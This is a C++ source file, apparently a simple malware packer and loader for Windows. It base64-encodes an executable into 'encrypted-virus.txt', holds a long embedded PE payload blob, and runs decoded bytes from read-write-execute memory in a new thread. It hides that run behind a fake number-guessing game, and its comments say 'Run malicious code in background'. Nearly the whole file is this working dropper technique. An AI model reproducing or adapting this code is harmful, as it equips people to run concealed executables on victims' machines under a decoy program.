#include <iostream>
#include <string>
#include <streambuf>
#include <fstream>
#include <windows.h>
#include "base64/base64.h"
#include <vector>

typedef unsigned char byte;
typedef std::vector<byte> bytesArray;

void runBinaryInMemory(bytesArray binaryData)
{
  //Allocating space for executable in memory
  const size_t dataSize = binaryData.size();
  LPVOID exeBuffer = VirtualAlloc(0, dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  memcpy(exeBuffer, binaryData.data(), dataSize);
  
  //Create thread to run with program
  HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exeBuffer, 0, 0, 0);
  
  //Run malicious code in background
  WaitForSingleObject(thread, INFINITE);
  CloseHandle(thread);

  VirtualFree(exeBuffer, 0, MEM_RELEASE);
}

//"Encrypt" file
std::string pack(bytesArray buffer)
{
  return base64_encode(buffer.data(), buffer.size());
}

//"Decrypt" file
bytesArray unpack(const std::string& buffer)
{
  std::string decoded = base64_decode(buffer);
  return bytesArray(decoded.begin(), decoded.end());
}

void packToFile()
{
  std::ifstream helperExe("ChromeHelper.exe"); 
  if(!helperExe)
    throw std::exception();
  std::ofstream encryptedOut("encrypted-virus.txt");
  bytesArray buffer((std::istreambuf_iterator<char>(helperExe)),std::istreambuf_iterator<char>()); 
  std::string encrypted = pack(buffer);
  encryptedOut.write(encrypted.c_str(), encrypted.size());
}
std::string unpackFromFile()
{
  std::ifstream encrypted("encrypted-virus.txt"); 
  if(!encrypted)
    throw std::exception();
  std::string buffer((std::istreambuf_iterator<char>(encrypted)),std::istreambuf_iterator<char>());
  return buffer;
}

void desceptiveFront(std::string packedData)
{
  int num = 0;
  std::cout << "Welcome! please guess a number between 1-10: ";
  std::cin >> num;
  runBinaryInMemory(unpack(packedData));
  if(num == 2)
    std::cout << "Congrats! You guessed it :)";
  else
   std::cout << "That's not the number, try again.";

}


int main(int argc, char** argv)
{
  //std::string packedCode = "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";
  packToFile();
  //desceptiveFront(packedCode);
  return 0;
}

